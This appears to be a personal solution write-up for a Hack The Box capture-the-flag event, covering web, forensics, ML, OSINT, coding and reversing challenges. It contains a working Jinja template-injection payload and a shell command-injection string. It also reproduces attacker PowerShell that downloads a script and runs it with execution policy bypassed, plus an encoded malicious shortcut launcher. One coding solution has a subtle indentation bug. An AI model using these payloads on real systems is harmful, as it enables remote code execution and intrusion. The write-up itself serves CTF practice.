## Web
- Trial by fire: `{{cycler.__init__.__globals__.os.popen('cat+flag.txt').read()}}`
- Whispers of the moonbeam: `gossip; cat flag.txt`

## Forensics
- Thorin's amulet: 
	- edit /etc/hosts, add generated IP to `korp.htb`
```sh
curl http://korp.htb:43405/update

function aqFVaq {
    Invoke-WebRequest -Uri "http://korp.htb/a541a" -Headers @{"X-ST4G3R-KEY"="5337d322906ff18afedc1edc191d325d"} -Method GET -OutFile a541a.ps1
    powershell.exe -exec Bypass -File "a541a.ps1"
}
aqFVaq
```

```sh
curl http://korp.htb:43405/a541a -H 'X-ST4G3R-KEY: 5337d322906ff18afedc1edc191d325d'

$a35 = "4854427b37683052314e5f4834355f346c573459355f3833336e5f344e5f39723334375f314e56336e3730727d"
($a35-split"(..)"|?{$_}|%{[char][convert]::ToInt16($_,16)}) -join ""
```

```sh
echo 4854427b37683052314e5f4834355f346c573459355f3833336e5f344e5f39723334375f314e56336e3730727d | xxd -r -p
HTB{7h0R1N_H45_4lW4Y5_833n_4N_9r347_1NV3n70r}
```

- A new Hire
	- An `eml` file is provided which mentions a link to a resume page
```sh
# this storage domain points to the docker container url
curl 'http://storage.microsoftcloudservices.com:47105/index.php'

# Above url shows a normal resume of John Doe, but the script tag points to another link
curl 'http://storage.microsoftcloudservices.com:47105/3fe1690d955e8fd2a0b282501570e1f4/resumes'

# A windows shortcut file is visible in above url
curl -O http://storage.microsoftcloudservices.com:47105/3fe1690d955e8fd2a0b282501570e1f4/resumes/Resume.pdf%20.lnk

# Reading the above shortcut file
exiftool Resume.pdf%20.lnk

# It showed a command line that executes a base64 string using powershell
# Decoding the string to a script file
echo 'WwBTAHkAcwB0AGUAbQAuAEQAaQBhAGcAbgBvAHMAdABpAGMAcwAuAFAAcgBvAGMAZQBzAHMAXQA6ADoAUwB0AGEAcgB0ACgAJwBtAHMAZQBkAGcAZQAnACwAIAAnAGgAdAB0AHAAOgAvAC8AcwB0AG8AcgBhAGcAZQAuAG0AaQBjAHIAbwBzAG8AZgB0AGMAbABvAHUAZABzAGUAcgB2AGkAYwBlAHMALgBjAG8AbQA6ADQANwAxADAANQAvADMAZgBlADEANgA5ADAAZAA5ADUANQBlADgAZgBkADIAYQAwAGIAMgA4ADIANQAwADEANQA3ADAAZQAxAGYANAAvAHIAZQBzAHUAbQBlAHMAUwAvAHIAZQBzAHUAbQBlAF8AbwBmAGYAaQBjAGkAYQBsAC4AcABkAGYAJwApADsAXABcAHMAdABvAHIAYQBnAGUALgBtAGkAYwByAG8AcwBvAGYAdABjAGwAbwB1AGQAcwBlAHIAdgBpAGMAZQBzAC4AYwBvAG0AQAA0ADcAMQAwADUAXAAzAGYAZQAxADYAOQAwAGQAOQA1ADUAZQA4AGYAZAAyAGEAMABiADIAOAAyADUAMAAxADUANwAwAGUAMQBmADQAXABwAHkAdABoAG8AbgAzADEAMgBcAHAAeQB0AGgAbwBuAC4AZQB4AGUAIABcAFwAcwB0AG8AcgBhAGcAZQAuAG0AaQBjAHIAbwBzAG8AZgB0AGMAbABvAHUAZABzAGUAcgB2AGkAYwBlAHMALgBjAG8AbQBAADQANwAxADAANQBcADMAZgBlADEANgA5ADAAZAA5ADUANQBlADgAZgBkADIAYQAwAGIAMgA4ADIANQAwADEANQA3ADAAZQAxAGYANABcAGMAbwBuAGYAaQBnAHMAXABjAGwAaQBlAG4AdAAuAHAAeQA=' | base64 -d > respdf.ps1

# 3 new links were mentioned in the encoded script
# downloading all 3 file and inspecting them individually
# Final flag was available in `client.py` file
curl -O http://storage.microsoftcloudservices.com:47105/3fe1690d955e8fd2a0b282501570e1f4/configs/client.py

# 'client.py' file contains an b64 encoded key
# Decoding the strings resulted in the flag
echo 'SFRCezRQVF8yOF80bmRfbTFjcjBzMGZ0X3MzNHJjaD0xbjF0MTRsXzRjYzNzISF9Cg==' | base64 -d
HTB{4PT_28_4nd_m1cr0s0ft_s34rch=1n1t14l_4cc3s!!}

```

## Machine Learning

```python
import torch

mdl = torch.load('./eldorian_artifact.pth')
arr_sum = sum(mdl['hidden.weight'])
flag = ''
for val in arr_sum:
    val = int(val)
    val = hex(val)
    flag += val[2:]

print(bytes.fromhex(flag).decode())
```

## OSINT
- Birds nest:
	- http://sevbru.altervista.org/a51/index.html#articolo
	- https://www.google.com/maps/place/Area+51,+NV,+USA/@37.2470738,-115.8124268,67m/data=!3m1!1e3!4m15!1m8!3m7!1s0x80b81baaba3e8c81:0x970427e38e6237ae!2sArea+51,+NV,+USA!3b1!8m2!3d37.2430548!4d-115.7930198!16zL20vMHlqcQ!3m5!1s0x80b81baaba3e8c81:0x970427e38e6237ae!8m2!3d37.2430548!4d-115.7930198!16zL20vMHlqcQ?entry=ttu&g_ep=EgoyMDI1MDMxOS4yIKXMDSoJLDEwMjExNDU1SAFQAw%3D%3D
- The Shadowed Sigil - `MITRE APT "139.5.177.205"`
- 

## Coding

- Enchanted Cipher

```python
# Input the text as a single string

input_text = input()
groups = input()
shifts = input()

# Write your solution below and make sure to encode the word correctly
shifts = eval(shifts)
i = 1
curr_shift = 0
res = ''
orda = ord('a')
for val in input_text:
	if val.isalpha():
		asc = ((ord(val) - orda) - shifts[curr_shift]) % 26
		res += chr(orda + asc)
		if i % 5 == 0:
			curr_shift += 1
		i += 1
	else:
		res += val
print(res)
```

- Dragon Fury
```python
# Input the text as a single string
input_text = eval(input()) # Example: "shock;979;23"
target = int(input())
  
# Write your solution below and make sure to encode the word correctly
import itertools as itr
  
for cmb in itr.product(*input_text):
	if sum(cmb) == target:
		print(list(cmb))
		break
```

- Dragon Flight
```python

# Write your solution using input1, input2, input3, input4, and input5.

seg_c, op_c = map(int, input().split())
segments = list(map(int, input().split()))
ops = []
for _ in range(op_c):
	op = input().split()
	ops.append([op[0], int(op[1]) - 1, int(op[2])])
	  
def get_max_sum(arr):
	if len(arr) == 0:
		return None
	  
	# Initialize variables
	max_current = max_global = arr[0]
	  
	# Iterate through the array starting from the second element
	for i in range(1, len(arr)):
		# Update max_current to be the maximum of the current element
		# or the current element plus the previous max_current
		max_current = max(arr[i], max_current + arr[i])
	  
	# Update max_global if max_current is greater
	if max_current > max_global:
		max_global = max_current
	  
	return max_global
  

for op, left, right in ops:
	if op == 'U':
		segments[left] = right
	else:
		res = get_max_sum(segments[left:right])
		if res is not None:
			print(res)


```

- Clockwork guardian
```python
# Input the text as a single string
input_text = eval(input())  # Example: "shock;979;23"

# Write your solution below and make sure to encode the word correctly
row_c = len(input_text)
col_c = len(input_text[0])

from collections import deque
 
def possiblePath(n, m, grid):
    # Create a queue to store the cells to explore
    q = deque()
    # Add the source cell to the queue and mark its distance as 0
    q.append((0, 0))
 
    # Define two arrays to represent the four directions of movement
    dx = [-1, 0, 1, 0]
    dy = [0, 1, 0, -1]
 
    # Create a 2D list to store the distance of each cell from the source
    dis = [[-1 for _ in range(m)] for _ in range(n)]
 
    # Set the distance of the source cell as 0
    dis[0][0] = 0
 
    # Loop until the queue is empty or the destination is reached
    while q:
        # Get the front cell from the queue and remove it
        p = q.popleft()
 
        # Loop through the four directions of movement
        for i in range(4):
            # Calculate the coordinates of the neighboring cell
            x = p[0] + dx[i]
            y = p[1] + dy[i]
            # Check if the neighboring cell is inside the grid and not visited before
            if 0 <= x < n and 0 <= y < m and dis[x][y] == -1:
                # Check if the neighboring cell is free or special
                if grid[x][y] == 'E':
                    return dis[p[0]][p[1]] + 1
                if grid[x][y] == 0:
                    # Set the distance of the neighboring cell as one more than the current cell
                    dis[x][y] = dis[p[0]][p[1]] + 1
                    # Add the neighboring cell to the queue for further exploration
                    q.append((x, y))

    # Return the distance of the destination cell from the source
    print('Not Found E')
    return dis[-1][-1]

print(possiblePath(row_c, col_c, input_text))
```

- Summoner's incantation
```python
# Input the text as a single string

input_text = eval(input()) # Example: "shock;979;23"

def maxLootRec(hval, n):
    
    # If no houses are left, return 0.
    if n <= 0:
        return 0
  
    # If only 1 house is left, rob it. 
    if n == 1:
        return hval[0]

    # Two Choices: Rob the nth house and do not rob the nth house 
    pick = hval[n - 1] + maxLootRec(hval, n - 2)
    notPick = maxLootRec(hval, n - 1)

    # Return the max of two choices
    return max(pick, notPick)

# Function to calculate the maximum stolen value
def maxLoot(hval):
    n = len(hval)
  
    # Call the recursive function for n houses
    return maxLootRec(hval, n)

print(maxLoot(input_text))
```

## Reversing
- extracted xored string from GDB, with xor key `0xbeefcafe`
```python
flag = [0xb6,0x9e,0xad,0xc5,0x92,0xfa,0xdf,0xd5,0xa1,0xa8,0xdc,0xc7,0xce,0xa4,0x8b,0xe1,0x8a,0xa2,0xdc,0xe1,0x89,0xfa,0x9d,0xd2,0x9a,0xb7]

xor_b = [0xfe, 0xca, 0xef, 0xbe]

i = 0
str = ''
while i < len(flag):
  val = flag[i] ^ xor_b[i%4]
  str += chr(val)
  i += 1

print(str)
```